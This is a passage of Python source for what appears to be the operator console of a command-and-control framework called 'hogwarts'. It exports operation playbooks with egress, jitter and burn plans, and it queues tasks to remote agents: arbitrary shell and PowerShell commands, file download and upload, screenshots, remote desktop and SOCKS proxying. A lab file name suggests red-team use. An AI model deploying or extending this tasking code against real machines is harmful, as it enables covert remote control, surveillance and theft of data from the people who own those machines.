        self._save_listener(quiet=True)
        self._save_playbook_fields()
        meta = self._store.load()
        fields = meta.get("playbook") if isinstance(meta.get("playbook"), dict) else {}
        path_info: dict[str, Any] = {}
        try:
            st = self._ctx.services.core.status(force=True)
            path_info = {
                "state": getattr(getattr(st, "state", None), "value", ""),
                "path_summary": getattr(st, "path_summary", ""),
                "local_proxy": getattr(st, "local_proxy", ""),
                "hops": list(getattr(st, "hops", None) or []),
                "fingerprint_note": getattr(st, "fingerprint_note", ""),
            }
        except Exception as exc:
            path_info = {"error": str(exc)}

        # Prefer form plane_url if set; never export api_token
        plane_url = str(fields.get("plane_url") or "")
        if not plane_url and self._plane.is_configured:
            plane_url = self._plane.base_url

        playbook = {
            "hogwarts_version": __version__,
            "exported": datetime.now(timezone.utc).isoformat(),
            "name": fields.get("name"),
            "objective": fields.get("objective"),
            "operator": fields.get("operator"),
            "channel_class": fields.get("channel_class"),
            "profile": fields.get("profile"),
            "agent_egress": fields.get("agent_egress"),
            "path_notes": fields.get("path_notes"),
            "sleep_budget_sec": fields.get("sleep_budget_sec"),
            "jitter": fields.get("jitter"),
            "burn_plan": fields.get("burn_plan"),
            "drill_last": fields.get("drill_last") or {},
            "listener": {
                "accept_host": meta.get("accept_host"),
                "accept_port": meta.get("accept_port"),
                "face": meta.get("face"),
                "agent_id": meta.get("agent_id"),
                "proto": meta.get("proto"),
                "notes": fields.get("listener_notes") or meta.get("notes"),
                "evidence": fields.get("listener_evidence"),
            },
            "notes": meta.get("notes"),
            "path": path_info,
            "plane": {
                "configured": self._plane.is_configured,
                "url": plane_url,
            },
            "last_probe": {
                "ts": meta.get("last_probe_ts"),
                "socks": meta.get("last_probe_socks"),
                "rows": meta.get("last_probe_rows"),
            },
            "timeline": list(meta.get("timeline") or [])[:200],
        }
        out = self._ctx.data_path(
            f"playbook-{datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')}.json"
        )
        out.write_text(json.dumps(playbook, indent=2) + "\n", encoding="utf-8")
        self._ops.playbook_path.set_text(str(out))
        self._log_msg(f"Playbook → {out.name}")
        if self._ctx.toast:
            self._ctx.toast(f"Playbook → {out.name}")

    def _console_command(self, line: str) -> str | None:
        import shlex

        parts = shlex.split(line)
        if not parts:
            return None
        cmd = parts[0].lower()
        if cmd == "status":
            self._refresh_status()
            plane = self._plane.base_url if self._plane.is_configured else "off"
            return f"path chip={self._chip.get_text()}  plane={plane}"
        if cmd == "plane":
            if not self._plane.is_configured:
                return "plane not configured"
            return f"url={self._plane.base_url}  token={'set' if self._plane.api_token else 'none'}"
        if cmd == "socks":
            s = self._socks_tuple()
            return f"socks5://{s[0]}:{s[1]}" if s else "no SOCKS (path down)"
        if cmd == "agents":
            self._refresh_agents()
            return "refreshing agents…"
        if cmd == "pull":
            if not self._plane.is_configured:
                return "plane not configured"
            try:
                events = self._client().poll_events(
                    since=self._events_since, limit=40
                )
            except Exception as exc:
                return f"pull failed: {exc}"
            if not events:
                return "no new events (cursor advanced; autopoll stays quiet)"
            lines = []
            for e in events[-20:]:
                ts = e.ts.strftime("%H:%M:%S") if e.ts else "?"
                lines.append(f"[{ts}] {e.level}/{e.channel} {e.message}")
                if e.ts:
                    self._events_since = e.ts.isoformat().replace("+00:00", "Z")
            return "\n".join(lines)
        if cmd in ("poll", "autopoll"):
            if not self._plane.is_configured:
                return "plane not configured — set Plane first"
            sec = int(float(self._plane.poll_interval_sec or 5))
            self._start_event_poll()
            return (
                f"background poll every {sec}s — console stays calm "
                f"(use `pull` for event stream; since={self._events_since or 'now'})"
            )
        if cmd == "poll-stop":
            self._stop_event_poll()
            return "auto-poll stopped"
        if cmd == "task":
            return self._console_task(parts[1:])
        # operator note
        self._log_msg(f"note: {line}")
        # append to local timeline (cap 200)
        data = self._store.load()
        tl = list(data.get("timeline") or [])
        tl.append(
            {
                "ts": datetime.now(timezone.utc).isoformat(),
                "text": line[:500],
            }
        )
        data["timeline"] = tl[-200:]
        self._store.save(data)
        return "noted"

    def _console_task(self, args: list[str]) -> str:
        """task <agent_id|host> <type> [args…]"""
        if not self._plane.is_configured:
            return "plane not configured"
        if len(args) < 2:
            return (
                "usage: task <agent_id|hostname> "
                "ping|shell|note|rekey|fs_list|fs_index_start|fs_index_status|fs_search|"
                "screenshot|desktop_start|desktop_stop|"
                "download|upload|socks_start|socks_stop [args]\n"
                "  shell: task <id> shell [sh|bash|…] <cmd…>\n"
                "  fs_list: task <id> fs_list [path]\n"
                "  screenshot: task <id> screenshot"
            )
        target, type_ = args[0], args[1].lower()
        rest = args[2:]
        # Resolve agent
        try:
            agents = self._client().list_agents(limit=200)
        except Exception as exc:
            return f"list agents failed: {exc}"
        agent = None
        for a in agents:
            if a.id == target or (a.hostname and a.hostname == target):
                agent = a
                break
            if a.hostname and target in a.hostname:
                agent = a
                break
        if not agent:
            return f"agent not found: {target}"

        payload: dict[str, Any] = {}
        if type_ == "ping":
            payload = {}
        elif type_ == "note":
            payload = {"text": " ".join(rest) or "console note"}
        elif type_ == "shell":
            if not rest:
                return "usage: task <id> shell [sh|bash|…] <cmd…>"
            shells = {
                "auto",
                "sh",
                "bash",
                "zsh",
                "fish",
                "cmd",
                "powershell",
                "ps",
                "pwsh",
            }
            shell = "auto"
            if rest[0].lower() in shells and len(rest) >= 2:
                shell = rest[0].lower()
                cmd = " ".join(rest[1:])
            else:
                cmd = " ".join(rest)
            payload = {"cmd": cmd, "shell": shell, "timeout_sec": 60}
        elif type_ == "fs_list":
            payload = {
                "path": rest[0] if rest else "",
                "show_hidden": False,
            }
        elif type_ == "screenshot":
            payload = {"max_side": 1920, "inline": True, "live": False}
        elif type_ == "desktop_start":
            payload = {"mode": rest[0] if rest else "auto", "port": 5901}
        elif type_ == "desktop_stop":
            payload = {}
        elif type_ == "download":
            if not rest:
                return "usage: task <id> download <path>"
            payload = {"path": rest[0]}
        elif type_ == "upload":
            import base64

            path = rest[0] if rest else "/tmp/hogwarts-lab-hello.txt"
            payload = {
                "path": path,
                "data": base64.b64encode(b"hogwarts lab upload\n").decode("ascii"),
            }
        elif type_ == "rekey":
            payload = {}
        elif type_ == "socks_start":
            port = int(rest[0]) if rest else 0
            payload = {"port": port}
        elif type_ == "socks_stop":
            payload = {}
        else:
            return f"unknown type {type_}"

        try:
            out = self._client().create_task(agent.id, type_=type_, payload=payload)
        except Exception as exc:
            return f"task failed: {exc}"
        tid = out.get("task_id") or out.get("id") or "?"
        self._log_msg(f"console task {tid} {type_} → {agent.id}")
        self._refresh_tasks(agent.id)
        return f"queued {type_} task_id={tid} agent={agent.hostname or agent.id}"

    def _log_msg(self, msg: str) -> None:
        msg = (msg or "").strip()
        if not msg:
            return
        # Collapse identical consecutive messages (refresh spam)
        last = self._log_lines[-1] if self._log_lines else ""
        if last.endswith(msg) or (last and last.split("] ", 1)[-1] == msg):
            # Bump a simple ×N suffix on the last line
            if " ·  ×" in last:
                try:
                    base, n_s = last.rsplit(" ·  ×", 1)
                    n = int(n_s) + 1
                    self._log_lines[-1] = f"{base} ·  ×{n}"
                except ValueError:
                    self._log_lines[-1] = f"{last} ·  ×2"
            else:
                self._log_lines[-1] = f"{last} ·  ×2"
        else:
            ts = datetime.now().strftime("%H:%M:%S")
            self._log_lines.append(f"[{ts}] {msg}")
        self._log_lines = self._log_lines[-200:]
        # Only push into the Log panel when it is visible — set_text every
        # screenshot/poll on a 200-line buffer was pure UI work for no reason.
        try:
            if self._stack.get_visible_child_name() == "log":
                self._log.set_text("\n".join(self._log_lines))
        except Exception:
            self._log.set_text("\n".join(self._log_lines))

    def _clear_log(self, *_a) -> None:
        self._log_lines.clear()
        self._log.set_text("")
